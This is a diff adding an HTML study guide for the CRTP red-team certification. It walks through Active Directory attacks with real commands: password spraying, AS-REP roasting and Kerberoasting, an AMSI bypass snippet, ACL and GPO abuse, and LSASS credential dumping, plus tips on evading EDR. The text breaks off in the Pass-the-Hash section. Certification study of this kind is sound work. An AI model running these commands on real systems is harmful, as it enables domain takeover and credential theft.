@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CRTP Field Guide — Attacking Active Directory</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+:root{
+  --bg:#0B0E14;
+  --panel:#11151F;
+  --panel2:#161B28;
+  --line:#232B3D;
+  --text:#DCE3EE;
+  --muted:#8A93A6;
+  --amber:#E8A33D;
+  --teal:#4FD1C5;
+  --red:#E0566B;
+  --violet:#9C8CF0;
+}
+*{box-sizing:border-box; margin:0; padding:0;}
+html{scroll-behavior:smooth;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:'Inter',sans-serif;
+  line-height:1.6;
+}
+body::before{
+  content:"";
+  position:fixed; inset:0;
+  background-image:
+    linear-gradient(var(--line) 1px, transparent 1px),
+    linear-gradient(90deg, var(--line) 1px, transparent 1px);
+  background-size:42px 42px;
+  opacity:.18;
+  pointer-events:none;
+  z-index:0;
+}
+h1,h2,h3,h4{font-family:'Space Grotesk',sans-serif; letter-spacing:-0.01em;}
+code, pre, .mono{font-family:'JetBrains Mono',monospace;}
+
+/* ---------- layout ---------- */
+.wrap{display:flex; position:relative; z-index:1;}
+nav{
+  width:280px; min-width:280px; height:100vh; overflow-y:auto;
+  background:var(--panel); border-right:1px solid var(--line);
+  position:sticky; top:0; padding:22px 16px 60px;
+}
+nav::-webkit-scrollbar{width:6px;}
+nav::-webkit-scrollbar-thumb{background:var(--line); border-radius:4px;}
+.brand{display:flex; align-items:center; gap:10px; margin-bottom:6px;}
+.brand-mark{
+  width:34px; height:34px; border-radius:8px;
+  background:linear-gradient(135deg,var(--amber),var(--red));
+  display:flex; align-items:center; justify-content:center;
+  font-family:'Space Grotesk'; font-weight:700; color:#0B0E14; font-size:14px;
+}
+.brand-title{font-family:'Space Grotesk'; font-weight:700; font-size:15px; color:var(--text);}
+.brand-sub{font-size:11px; color:var(--muted); margin-bottom:20px;}
+.nav-phase{
+  font-size:10.5px; text-transform:uppercase; letter-spacing:.12em;
+  color:var(--muted); margin:18px 0 6px; padding-left:4px;
+}
+.nav-link{
+  display:block; padding:6px 8px; border-radius:6px; font-size:13px;
+  color:var(--muted); text-decoration:none; cursor:pointer;
+  border-left:2px solid transparent;
+}
+.nav-link:hover{color:var(--text); background:var(--panel2);}
+.nav-link.sub{padding-left:18px; font-size:12.5px;}
+
+main{flex:1; min-width:0; padding:48px 56px 120px; max-width:1080px;}
+
+/* ---------- hero ---------- */
+.hero{margin-bottom:64px;}
+.eyebrow{
+  font-size:11px; text-transform:uppercase; letter-spacing:.16em; color:var(--amber);
+  font-family:'JetBrains Mono'; margin-bottom:14px;
+}
+.hero h1{font-size:42px; font-weight:700; line-height:1.12; max-width:760px;}
+.hero h1 span{color:var(--amber);}
+.hero p{color:var(--muted); max-width:640px; margin-top:16px; font-size:15.5px;}
+.path-rail{
+  display:flex; align-items:stretch; gap:0; margin-top:36px;
+  border:1px solid var(--line); border-radius:12px; overflow:hidden; background:var(--panel);
+}
+.path-step{flex:1; padding:16px 18px; border-right:1px solid var(--line); position:relative;}
+.path-step:last-child{border-right:none;}
+.path-step .n{font-family:'JetBrains Mono'; color:var(--amber); font-size:11px;}
+.path-step h4{font-size:13.5px; margin-top:6px;}
+.path-step p{font-size:11.5px; color:var(--muted); margin-top:4px;}
+
+/* ---------- sections ---------- */
+section{margin-bottom:56px; padding-top:8px;}
+.phase-head{
+  display:flex; align-items:baseline; gap:14px; margin-bottom:6px;
+  border-bottom:1px solid var(--line); padding-bottom:14px;
+}
+.phase-head .tag{
+  font-family:'JetBrains Mono'; font-size:11px; padding:4px 9px; border-radius:5px;
+  background:var(--panel2); color:var(--amber); border:1px solid var(--line);
+}
+.phase-head h2{font-size:24px;}
+.phase-desc{color:var(--muted); font-size:13.5px; margin:10px 0 26px; max-width:680px;}
+
+details{
+  background:var(--panel); border:1px solid var(--line); border-radius:10px;
+  margin-bottom:12px; overflow:hidden;
+}
+details[open]{border-color:#2c3650;}
+summary{
+  list-style:none; cursor:pointer; padding:14px 18px; display:flex; align-items:center; gap:12px;
+  font-family:'Space Grotesk'; font-weight:600; font-size:14.5px;
+}
+summary::-webkit-details-marker{display:none;}
+summary .idx{
+  font-family:'JetBrains Mono'; font-size:11px; color:var(--amber); min-width:48px;
+}
+summary::after{
+  content:"+"; margin-left:auto; color:var(--muted); font-size:18px; font-weight:400;
+}
+details[open] summary::after{content:"–";}
+.body{padding:0 18px 20px 18px; font-size:13.8px;}
+.body p{margin-bottom:10px; color:#C5CCDA;}
+.body p.def{
+  background:var(--panel2); border-left:3px solid var(--teal); padding:10px 14px; border-radius:6px;
+  color:var(--text); font-size:13.3px; margin-bottom:14px;
+}
+.body p.ex{color:var(--muted); font-style:italic; font-size:13px;}
+
+pre{
+  background:#0A0C12; border:1px solid var(--line); border-radius:8px;
+  padding:12px 14px; overflow-x:auto; font-size:12.5px; margin:10px 0 14px;
+  color:#A8E8DC;
+}
+pre .c1{color:var(--muted);}
+.inline-code{background:var(--panel2); padding:1px 6px; border-radius:4px; font-size:12.5px; color:var(--amber);}
+
+.toolbox{
+  display:flex; flex-wrap:wrap; gap:8px; margin:10px 0 4px;
+}
+.tool-pill{
+  display:inline-flex; align-items:center; gap:6px;
+  font-family:'JetBrains Mono'; font-size:11.5px;
+  background:var(--panel2); border:1px solid var(--line); border-radius:20px;
+  padding:5px 12px; color:var(--text); text-decoration:none;
+}
+.tool-pill:hover{border-color:var(--amber); color:var(--amber);}
+.tool-pill .dot{width:6px; height:6px; border-radius:50%; background:var(--teal);}
+
+.warn{
+  display:flex; gap:10px; background:rgba(224,86,107,0.08); border:1px solid rgba(224,86,107,0.35);
+  border-radius:8px; padding:10px 14px; font-size:12.8px; color:#F0A8B3; margin:12px 0;
+}
+.note{
+  display:flex; gap:10px; background:rgba(79,209,197,0.07); border:1px solid rgba(79,209,197,0.3);
+  border-radius:8px; padding:10px 14px; font-size:12.8px; color:#9FE7DD; margin:12px 0;
+}
+
+.grid2{display:grid; grid-template-columns:1fr 1fr; gap:12px;}
+@media (max-width:760px){.grid2{grid-template-columns:1fr;}}
+
+table{width:100%; border-collapse:collapse; font-size:12.8px; margin:10px 0;}
+th,td{border:1px solid var(--line); padding:7px 10px; text-align:left;}
+th{background:var(--panel2); color:var(--amber); font-family:'JetBrains Mono'; font-size:11px;}
+td{color:#C5CCDA;}
+
+.glossary-grid{display:grid; grid-template-columns:1fr 1fr; gap:10px;}
+@media (max-width:760px){.glossary-grid{grid-template-columns:1fr;}}
+.gterm{background:var(--panel); border:1px solid var(--line); border-radius:8px; padding:12px 14px;}
+.gterm h4{font-size:13px; color:var(--amber); margin-bottom:4px;}
+.gterm p{font-size:12.5px; color:var(--muted);}
+
+footer{
+  border-top:1px solid var(--line); padding:30px 56px; color:var(--muted); font-size:12px;
+}
+
+@media (max-width:900px){
+  nav{display:none;}
+  main{padding:32px 20px 100px;}
+  .hero h1{font-size:30px;}
+  .path-rail{flex-direction:column;}
+  .path-step{border-right:none; border-bottom:1px solid var(--line);}
+}
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <nav>
+    <div class="brand">
+      <div class="brand-mark">AD</div>
+      <div class="brand-title">CRTP Field Guide</div>
+    </div>
+    <div class="brand-sub">Attacking Active Directory · roadmap to CRTE</div>
+
+    <div class="nav-phase">Start</div>
+    <a class="nav-link" href="#hero">Roadmap</a>
+
+    <div class="nav-phase">1 · Black Box</div>
+    <a class="nav-link sub" href="#port-scanning">Port Scanning</a>
+    <a class="nav-link sub" href="#asrep">AS‑REP Roasting</a>
+    <a class="nav-link sub" href="#bruteforce">Credential Brute Force</a>
+
+    <div class="nav-phase">2 · Initial Foothold</div>
+    <a class="nav-link sub" href="#amsi">AMSI Bypass</a>
+
+    <div class="nav-phase">3 · Domain Enumeration</div>
+    <a class="nav-link sub" href="#enum-basics">Users / Computers / Groups</a>
+    <a class="nav-link sub" href="#acl-enum">ACLs &amp; GPOs</a>
+    <a class="nav-link sub" href="#forest-enum">Forest &amp; Trusts</a>
+    <a class="nav-link sub" href="#bloodhound">BloodHound Ecosystem</a>
+
+    <div class="nav-phase">4 · Lateral Movement</div>
+    <a class="nav-link sub" href="#kerberoast">Kerberoasting</a>
+    <a class="nav-link sub" href="#acl-abuse">ACL Abuse</a>
+    <a class="nav-link sub" href="#laps">LAPS &amp; GPO Abuse</a>
+    <a class="nav-link sub" href="#creds">Credential Dumping</a>
+    <a class="nav-link sub" href="#pth">Pass‑the‑Hash / OPtH</a>
+
+    <div class="nav-phase">5 · Domain Privesc</div>
+    <a class="nav-link sub" href="#delegation">Delegation Attacks</a>
+    <a class="nav-link sub" href="#tickets">Forged Tickets</a>
+    <a class="nav-link sub" href="#dcsync">DCSync &amp; DPAPI</a>
+
+    <div class="nav-phase">6 · Beyond the Domain</div>
+    <a class="nav-link sub" href="#adcs">AD CS (ESC1–15)</a>
+    <a class="nav-link sub" href="#trusts">Trust &amp; Forest Attacks</a>
+    <a class="nav-link sub" href="#mssql">MSSQL Abuse</a>
+
+    <div class="nav-phase">Reference</div>
+    <a class="nav-link sub" href="#toolbox-all">Tool Index</a>
+    <a class="nav-link sub" href="#glossary">Glossary</a>
+  </nav>
+
+  <main>
+
+    <section class="hero" id="hero">
+      <div class="eyebrow">// Certified Red Team Professional — study companion</div>
+      <h1>From open port to <span>Domain Admin</span>, one concept at a time.</h1>
+      <p>This guide walks the exact path CRTP teaches: start with nothing (black box), get a foothold (gray box), enumerate the domain, move laterally, escalate to Domain Admin, then push into trusts, certificates, and SQL servers. Every technique includes a plain‑English definition, a worked example, the real command, and the GitHub source of the tool — so you understand the "why" before memorizing the "how".</p>
+
+      <div class="path-rail">
+        <div class="path-step"><div class="n">01</div><h4>Recon</h4><p>Scan ports, guess usernames, no credentials yet.</p></div>
+        <div class="path-step"><div class="n">02</div><h4>Foothold</h4><p>One set of valid creds — enumerate everything.</p></div>
+        <div class="path-step"><div class="n">03</div><h4>Map</h4><p>BloodHound shows every path to Domain Admin.</p></div>
+        <div class="path-step"><div class="n">04</div><h4>Abuse</h4><p>ACLs, delegation, GPOs — turn permissions into access.</p></div>
+        <div class="path-step"><div class="n">05</div><h4>Dominate</h4><p>DCSync, Golden Tickets, persistence.</p></div>
+        <div class="path-step"><div class="n">06</div><h4>Expand</h4><p>Cross trust, AD CS, SQL links — beyond one domain.</p></div>
+      </div>
+    </section>
+
+    <!-- ============ PHASE 1: BLACK BOX ============ -->
+    <section id="port-scanning-phase">
+      <div class="phase-head"><span class="tag">PHASE 1</span><h2>Black Box Testing</h2></div>
+      <p class="phase-desc">You have a network jack and nothing else — no usernames, no creds, no domain‑joined laptop. The goal is to find a Domain Controller and squeeze out a first username or password.</p>
+
+      <details id="port-scanning">
+        <summary><span class="idx">1.1</span>Port Scanning</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Probing a host's TCP/UDP ports to learn which services are running. In AD, you are specifically hunting for ports that only a Domain Controller exposes.</p>
+          <p><b>Why it matters:</b> Finding port 88 (Kerberos), 389 (LDAP), and 445 (SMB) open together on one host almost always means "this is a Domain Controller" — your first real target.</p>
+          <table>
+            <tr><th>Port</th><th>Service</th><th>Why it's interesting</th></tr>
+            <tr><td>53</td><td>DNS</td><td>DCs are usually also DNS servers for the domain</td></tr>
+            <tr><td>88</td><td>Kerberos</td><td>Needed for AS‑REP roasting / ticket requests</td></tr>
+            <tr><td>389 / 636</td><td>LDAP / LDAPS</td><td>Lets you query the directory (users, groups, ACLs)</td></tr>
+            <tr><td>445</td><td>SMB</td><td>File shares, null sessions, relay targets</td></tr>
+            <tr><td>3268 / 3269</td><td>Global Catalog</td><td>Forest‑wide LDAP search</td></tr>
+          </table>
+          <pre>nmap -p 53,88,135,139,389,445,464,593,636,3268,3269 -sV 10.10.10.0/24
+<span class="c1"># or quick service sweep with a fast scanner</span>
+naabu -host 10.10.10.0/24 -p 88,389,445</pre>
+          <p class="ex"><b>Example:</b> Scanning 10.10.10.0/24 returns one host with 88, 389 and 445 all open — that host is almost certainly the Domain Controller for the range, and its hostname/domain name often appears in the LDAP banner.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/nmap/nmap" target="_blank"><span class="dot"></span>nmap</a>
+            <a class="tool-pill" href="https://github.com/projectdiscovery/naabu" target="_blank"><span class="dot"></span>naabu</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="asrep">
+        <summary><span class="idx">1.2.1</span>Username Enumeration → AS‑REP Roasting</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> AS‑REP Roasting targets accounts with <span class="inline-code">"Do not require Kerberos preauthentication"</span> enabled. Kerberos normally asks you to prove you know the password <i>before</i> issuing a ticket (preauth). If that check is disabled, anyone can request a ticket for that user — no password needed — and the ticket comes back encrypted with a hash of the user's password, which you can then crack offline.</p>
+          <p><b>Step 1 — find valid usernames</b> (Kerberos lets you check whether a username exists, without a password):</p>
+          <pre>kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt</pre>
+          <p><b>Step 2 — request AS‑REP for users with preauth disabled, then crack offline:</b></p>
+          <pre>impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
+hashcat -m 18200 asrep.txt rockyou.txt</pre>
+          <p class="ex"><b>Example:</b> The user <span class="inline-code">svc-backup</span> was set up years ago with preauth disabled for a legacy app. <span class="inline-code">GetNPUsers</span> grabs its AS‑REP hash with zero credentials; hashcat then cracks the weak password "Summer2023!" offline in seconds.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/ropnop/kerbrute" target="_blank"><span class="dot"></span>kerbrute</a>
+            <a class="tool-pill" href="https://github.com/fortra/impacket" target="_blank"><span class="dot"></span>impacket</a>
+            <a class="tool-pill" href="https://github.com/hashcat/hashcat" target="_blank"><span class="dot"></span>hashcat</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="bruteforce">
+        <summary><span class="idx">1.2.2</span>Credentials Brute Force</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Trying many passwords against one account (brute force) or one common password against many accounts (password spraying) to avoid account lockouts.</p>
+          <div class="warn">⚠ Always check the domain's lockout policy first (<span class="inline-code">net accounts</span> or the Kerberos policy via LDAP) — a few wrong guesses per account, spread across all accounts, stays under the radar; many guesses on one account locks it out and alerts the blue team.</div>
+          <pre>kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt 'Summer2024!'
+<span class="c1"># NetExec for SMB/LDAP based spraying</span>
+netexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success</pre>
+          <p class="ex"><b>Example:</b> Spraying the single password "Welcome1" against 400 enumerated usernames over Kerberos (which doesn't trigger the same lockout counters as SMB in some configs) reveals three accounts still using the default onboarding password.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/ropnop/kerbrute" target="_blank"><span class="dot"></span>kerbrute</a>
+            <a class="tool-pill" href="https://github.com/Pennyw0rth/NetExec" target="_blank"><span class="dot"></span>NetExec (CME successor)</a>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ PHASE 2: GRAY BOX - INITIAL ACCESS ============ -->
+    <section id="grayboxintro">
+      <div class="phase-head"><span class="tag">PHASE 2</span><h2>Gray Box Testing — Initial Access</h2></div>
+      <p class="phase-desc">You now have one set of valid credentials (handed to you, or won in Phase 1) and a session on a domain‑joined machine — exactly the CRTP lab starting position.</p>
+
+      <details id="amsi">
+        <summary><span class="idx">2.1.1</span>Bypass Antimalware Scan Interface (AMSI)</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> AMSI is a Windows interface that lets antivirus engines inspect script content (PowerShell, VBScript) <i>before</i> it runs, even in‑memory. An "AMSI bypass" patches or confuses this interface in your own PowerShell process so that offensive tools (PowerView, Mimikatz, Rubeus) load without being flagged.</p>
+          <p><b>Why it matters:</b> Almost every classic AD attack tool is written in PowerShell or C# loaded reflectively into a PowerShell process. Without bypassing AMSI first, Defender kills the script the moment it's typed.</p>
+          <pre><span class="c1"># classic reflection-based patch (concept, signatures change often)</span>
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f = $a.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null,$true)</pre>
+          <div class="note">📝 Public one‑liners get signatured fast. In real engagements (and in the CRTP lab), expect to tweak variable names/obfuscate, or use an updated bypass from a maintained repo.</div>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank"><span class="dot"></span>Amsi-Bypass-Powershell</a>
+            <a class="tool-pill" href="https://github.com/p3nt4/PowerShdll" target="_blank"><span class="dot"></span>PowerShdll</a>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ PHASE 3: DOMAIN ENUMERATION ============ -->
+    <section id="enumphase">
+      <div class="phase-head"><span class="tag">PHASE 3</span><h2>Domain Enumeration</h2></div>
+      <p class="phase-desc">With one valid login, you can query the directory itself — Active Directory is, at its core, a giant searchable database (LDAP), and almost every authenticated user can read most of it by default.</p>
+
+      <details id="enum-basics">
+        <summary><span class="idx">3.2</span>Users · Computers · Groups · OUs</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Domain enumeration is systematically pulling objects out of LDAP: user accounts, computer accounts, security groups (Domain Admins, Enterprise Admins, Administrators), Organizational Units (OUs — folders that organize objects and receive GPOs), and the Kerberos policy (lockout/ticket lifetime settings).</p>
+          <pre><span class="c1"># PowerView (load reflectively after an AMSI bypass)</span>
+Get-DomainUser | select samaccountname,description
+Get-DomainComputer | select dnshostname,operatingsystem
+Get-DomainGroupMember "Domain Admins" -Recurse
+Get-DomainOU | select name,distinguishedname
+Get-DomainGPO | select displayname
+
+<span class="c1"># ActiveDirectory RSAT module equivalents</span>
+Get-ADUser -Filter * -Properties description
+Get-ADGroupMember "Domain Admins"
+Get-ADOrganizationalUnit -Filter *
+
+<span class="c1"># Living-off-the-land, no tools needed</span>
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain</pre>
+          <p class="ex"><b>Example:</b> <span class="inline-code">Get-DomainUser | select description</span> often surfaces helpdesk notes like "temp pw: Welcome2024" left in the description field — a real, common finding.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon" target="_blank"><span class="dot"></span>PowerView (PowerSploit)</a>
+            <a class="tool-pill" href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView" target="_blank"><span class="dot"></span>PowerView (dev branch)</a>
+            <a class="tool-pill" href="https://github.com/Gerenios/AADInternals" target="_blank"><span class="dot"></span>ActiveDirectory module (RSAT)</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="acl-enum">
+        <summary><span class="idx">3.2.13–14</span>Access Control Lists &amp; GPOs</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Every AD object has a security descriptor — a DACL listing exactly who can do what to it (reset password, write attributes, add members, etc). "Interesting" ACLs are permissions a low‑privileged user holds over a higher‑value object, usually granted by accident.</p>
+          <pre>Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
+Get-ObjectAcl -SamAccountName "svc-web" -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}
+
+<span class="c1"># GPO applied on a specific OU</span>
+Get-DomainGPO -ComputerIdentity WS01
+Get-DomainOU -GPLink "*{GUID}*"</pre>
+          <p class="ex"><b>Example:</b> A helpdesk group was once given <span class="inline-code">GenericAll</span> on the IT_Admins OU to "reset passwords" — but that right also lets them reset passwords for every admin account inside that OU, an unintended escalation path.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/PowerShellMafia/PowerSploit" target="_blank"><span class="dot"></span>PowerView</a>
+            <a class="tool-pill" href="https://github.com/Gandalf-D1/gpoParser" target="_blank"><span class="dot"></span>gpoParser</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="forest-enum">
+        <summary><span class="idx">3.3</span>Forest, Domain &amp; Trust Enumeration</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> A <b>forest</b> is a collection of one or more domains sharing a schema and a top‑level "Enterprise Admin" group. A <b>trust</b> is a relationship that lets users in one domain authenticate to resources in another. Trusts can be one‑way or bidirectional, and within‑forest or across‑forest.</p>
+          <pre>Get-Domain
+Get-ForestDomain
+Get-DomainTrust
+Get-ForestTrust
+Get-DomainTrustMapping  <span class="c1"># walk every trust recursively</span></pre>
+          <p class="ex"><b>Example:</b> <span class="inline-code">corp.local</span> trusts <span class="inline-code">prod.corp.local</span> bidirectionally — meaning a compromise in either domain is a realistic stepping stone into the other.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/PowerShellMafia/PowerSploit" target="_blank"><span class="dot"></span>PowerView</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="bloodhound">
+        <summary><span class="idx">3.5–3.8</span>BloodHound Ecosystem</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> BloodHound represents AD as a graph: nodes are users/computers/groups, edges are relationships ("MemberOf", "HasSession", "GenericAll", "CanRDP"...). It then runs graph queries like "shortest path to Domain Admin" — turning hundreds of manual enumeration commands into one picture.</p>
+          <div class="grid2">
+            <div>
+              <p><b>Collectors (pick one):</b></p>
+              <table>
+                <tr><th>Collector</th><th>Language</th><th>Notes</th></tr>
+                <tr><td>SharpHound</td><td>C#</td><td>Official, most complete, easiest to detect</td></tr>
+                <tr><td>NetExec (bloodhound module)</td><td>Python</td><td>Cross‑platform, good for Linux attack boxes</td></tr>
+                <tr><td>RustHound‑CE</td><td>Rust</td><td>Fast, single static binary, CE‑schema native</td></tr>
+              </table>
+            </div>
+            <div>
+              <p><b>Analysis layer:</b></p>
+              <table>
+                <tr><th>Tool</th><th>Use</th></tr>
+                <tr><td>BloodHound CE</td><td>Web UI + Cypher queries over the graph</td></tr>
+                <tr><td>AD Miner</td><td>Generates an HTML risk report from the same data</td></tr>
+              </table>
+            </div>
+          </div>
+          <pre><span class="c1"># collect</span>
+SharpHound.exe -c All
+netexec ldap dc01.corp.local -u user -p pass --bloodhound -c All
+rusthound-ce -d corp.local -u user -p pass -z   <span class="c1"># zip output</span>
+
+<span class="c1"># find Kerberoastable accounts from inside the GUI's Cypher search:</span>
+MATCH (u:User {hasspn:true}) RETURN u</pre>
+          <p class="ex"><b>Example:</b> Running "Shortest Paths to Domain Admins" from a freshly compromised helpdesk account shows a 3‑hop chain: helpdesk → GenericWrite on a service account → that account is a local admin on a server where a Domain Admin has an active session.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/SpecterOps/BloodHound" target="_blank"><span class="dot"></span>BloodHound CE</a>
+            <a class="tool-pill" href="https://github.com/SpecterOps/SharpHound" target="_blank"><span class="dot"></span>SharpHound</a>
+            <a class="tool-pill" href="https://github.com/Pennyw0rth/NetExec" target="_blank"><span class="dot"></span>NetExec</a>
+            <a class="tool-pill" href="https://github.com/g0h4n/RustHound-CE" target="_blank"><span class="dot"></span>RustHound-CE</a>
+            <a class="tool-pill" href="https://github.com/Mazars-Tech/AD_Miner" target="_blank"><span class="dot"></span>AD Miner</a>
+          </div>
+        </div>
+      </details>
+    </section>
+
+    <!-- ============ PHASE 4: LATERAL MOVEMENT ============ -->
+    <section id="lateralphase">
+      <div class="phase-head"><span class="tag">PHASE 4</span><h2>Lateral Movement &amp; Credential Theft</h2></div>
+      <p class="phase-desc">Turn one foothold into many. This is where enumeration findings become actual access.</p>
+
+      <details id="kerberoast">
+        <summary><span class="idx">3.9</span>Kerberoasting</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Any authenticated user can request a Kerberos service ticket (TGS) for any account that has a Service Principal Name (SPN) — typically service accounts. That ticket is encrypted with a hash derived from the service account's password. You take the ticket offline and crack it; no alerts, no lockouts, because requesting a ticket is completely normal Kerberos behavior.</p>
+          <pre>Get-DomainUser -SPN | select samaccountname,serviceprincipalname
+impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.10.10.10 -request
+hashcat -m 13100 spn_hashes.txt rockyou.txt</pre>
+          <p class="ex"><b>Example:</b> The SQL service runs as <span class="inline-code">svc-sql</span> with SPN <span class="inline-code">MSSQLSvc/db01:1433</span>. Its ticket cracks to reveal a password that was never rotated since the server was built — instant lateral access to anything that account can touch.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/fortra/impacket" target="_blank"><span class="dot"></span>impacket</a>
+            <a class="tool-pill" href="https://github.com/GhostPack/Rubeus" target="_blank"><span class="dot"></span>Rubeus</a>
+            <a class="tool-pill" href="https://github.com/hashcat/hashcat" target="_blank"><span class="dot"></span>hashcat</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="acl-abuse">
+        <summary><span class="idx">3.23</span>ACL Abuse — GenericAll / GenericWrite / WriteDacl / AddSelf / AddMember / WriteOwner / ForceChangePassword</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Each ACE (access control entry) you found while enumerating is a separate attack primitive. The right determines exactly what you can do:</p>
+          <table>
+            <tr><th>Right</th><th>What it lets you do</th></tr>
+            <tr><td>GenericAll</td><td>Full control — reset password, add to group, anything</td></tr>
+            <tr><td>GenericWrite</td><td>Edit most attributes — e.g. set a logon script that runs as the target</td></tr>
+            <tr><td>WriteDacl</td><td>Rewrite the object's own permissions — grant yourself GenericAll</td></tr>
+            <tr><td>WriteOwner</td><td>Become the object's owner, then grant yourself rights</td></tr>
+            <tr><td>ForceChangePassword</td><td>Reset the target's password without knowing the old one</td></tr>
+            <tr><td>AddSelf / AddMember</td><td>Add yourself (or another account) into a group</td></tr>
+          </table>
+          <pre><span class="c1"># GenericAll over a user -&gt; reset their password</span>
+Set-DomainUserPassword -Identity jdoe -AccountPassword (ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)
+
+<span class="c1"># GenericAll/AddMember over a group -&gt; add yourself</span>
+Add-DomainGroupMember -Identity "Domain Admins" -Members "currentuser"
+
+<span class="c1"># WriteDacl -&gt; grant yourself GenericAll, then use it</span>
+Add-DomainObjectAcl -TargetIdentity "svc-sql" -PrincipalIdentity "currentuser" -Rights All</pre>
+          <p class="ex"><b>Example:</b> BloodHound shows your compromised account has <span class="inline-code">GenericAll</span> on the <span class="inline-code">svc-backup</span> account — and <span class="inline-code">svc-backup</span> happens to be a member of Domain Admins. Resetting its password is a one‑command path to Domain Admin.</p>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/PowerShellMafia/PowerSploit" target="_blank"><span class="dot"></span>PowerView</a>
+            <a class="tool-pill" href="https://github.com/BloodHoundAD/BloodHound.py" target="_blank"><span class="dot"></span>BloodHound</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="laps">
+        <summary><span class="idx">3.15–16</span>LAPS Password Read &amp; GPO Abuse</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> LAPS (Local Administrator Password Solution) auto‑rotates each computer's local Administrator password and stores it as an attribute in AD, readable only by delegated groups. If your account is (often unintentionally) in that delegated group, you can read any managed machine's local admin password. <b>GPO abuse</b> means editing a Group Policy Object you have write access to, so it pushes a malicious scheduled task / startup script to every computer it applies to.</p>
+          <pre><span class="c1"># Read LAPS password (legacy attribute name shown; newer LAPS uses msLAPS-Password)
+Get-DomainObject -Identity WS01 -Properties ms-mcs-AdmPwd
+
+<span class="c1"># Evil-WinRM has a built-in LAPS reader once you have rights</span>
+evil-winrm -i ws01.corp.local -u Administrator -p '&lt;laps-password&gt;'
+
+<span class="c1"># Abuse write access to a GPO -&gt; add a scheduled task (SharpGPOAbuse)</span>
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author corp\jdoe --Command "cmd.exe" --Arguments "/c net localgroup administrators jdoe /add" --GPOName "Default Domain Policy"</pre>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/Hackplayers/evil-winrm" target="_blank"><span class="dot"></span>Evil-WinRM</a>
+            <a class="tool-pill" href="https://github.com/FSecureLABS/SharpGPOAbuse" target="_blank"><span class="dot"></span>SharpGPOAbuse</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="creds">
+        <summary><span class="idx">3.17</span>Dump Credentials</summary>
+        <div class="body">
+          <p class="def"><b>Definition:</b> Once you're local admin on a box, you can pull credential material out of memory (LSASS process) or local databases (SAM): plaintext passwords (if WDigest is on), NTLM hashes, and Kerberos tickets.</p>
+          <pre>mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+mimikatz # lsadump::sam
+
+<span class="c1"># OPSEC-safer / EDR-resistant alternative: dump LSASS to disk and parse offline</span>
+procdump64.exe -ma lsass.exe lsass.dmp
+pypykatz lsa minidump lsass.dmp</pre>
+          <div class="warn">⚠ LSASS dumping is one of the most heavily signatured actions in modern EDR. Mimikatz itself is almost always flagged — expect to use loaders, obfuscation, or alternative extraction methods on real engagements.</div>
+          <div class="toolbox">
+            <a class="tool-pill" href="https://github.com/gentilkiwi/mimikatz" target="_blank"><span class="dot"></span>Mimikatz</a>
+            <a class="tool-pill" href="https://github.com/skelsec/pypykatz" target="_blank"><span class="dot"></span>pypykatz</a>
+          </div>
+        </div>
+      </details>
+
+      <details id="pth">
+        <summary><span class="idx">3.18–19</span>Pass‑the‑Hash (PtH) &amp; OverPass‑the‑Hash (OPtH)</summary>
+        <div class="body">
+          <p class="def"><b>Pass‑the‑Hash:</b> Authenticate over NTLM using a stolen NTLM hash directly — you never need the plaintext password.</p>
